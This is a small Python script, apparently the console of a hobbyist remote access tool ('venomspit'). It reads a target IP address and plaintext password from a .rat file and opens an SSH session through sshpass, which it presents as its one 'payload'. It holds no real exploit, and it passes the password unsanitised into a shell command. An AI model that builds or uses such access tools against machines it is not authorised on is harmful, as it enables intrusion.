#!/usr/bin/python
#python console

import os
import sys
import getpass
#from paramiko import SSHClient
from modules import *

#variables
banner = """

	[::] Ultimate V3n0m [::]
"""
help_menu = """
	
	
	Arguments:
		XXX.rat = configuration file to add to venomspit
	
	Example:
		python3 main.py -f venomspit.rat
"""
options_menu = """
	[*] Select a number to select a payload [*]	
	
	Payloads:
		[0] Remote Console
"""
username = getpass.getuser()
header = f"{username}@venomspit $"

#read config file
def read_config(config_file):
	configuration = {}
	
	#get file contents
	read_lines = open(config_file, "r").readlines()
	
	#get target configuration
	configuration["IPADDRESS"] = read_lines[0].strip()
	configuration["PASSWORD"] = read_lines[1].strip()
	configuration["WORKINGDIRECTORY"] = read_lines[2].strip()
	
	return configuration
	
def os_detection():
	#windows
	if os.name == "nt":
		return "w"
		#other
	if os.name == "posix":
		return "l"
	
#connects rat to taarget
def connect(address, password):
	
	#REMOTELY connect
	os.system(f"sshpass -p \"{password}\" ssh venomspit@{address}")
	
#terminate program
def exit():
	print("[!!] Exiting... [!!]")
	sys.exit()
	
# cli interfce
def cli(arguments):
	#display banner
	print(banner)
	#if args exist
	if arguments:
		print(options_menu)
		
		option = input(f"{header}")
		
		try:
			configuration = read_config(sys.argv[1])
		
		except FileNotFoundError:
			print("\n[!!] File does not exist [!!]")
			exit()
	
		#get config info
		ipv4 = configuration.get("IPADDRESS")
		password = configuration.get("PASSWORD")
		working_directory = configuration.get("WORKINGDIRECTORY")
		
		if option == "0":
			connect(ipv4, password)
		
	#if not
	else:
		print(help_menu)
	

#main code
def main():

	# checks for args
	try:
		sys.argv[1]
	except IndexError:
		arguments_exist = False
	else:
		arguments_exist = True
		
	cli(arguments_exist)
	
	pass

#runs main code
if __name__ == "__main__":
	main()
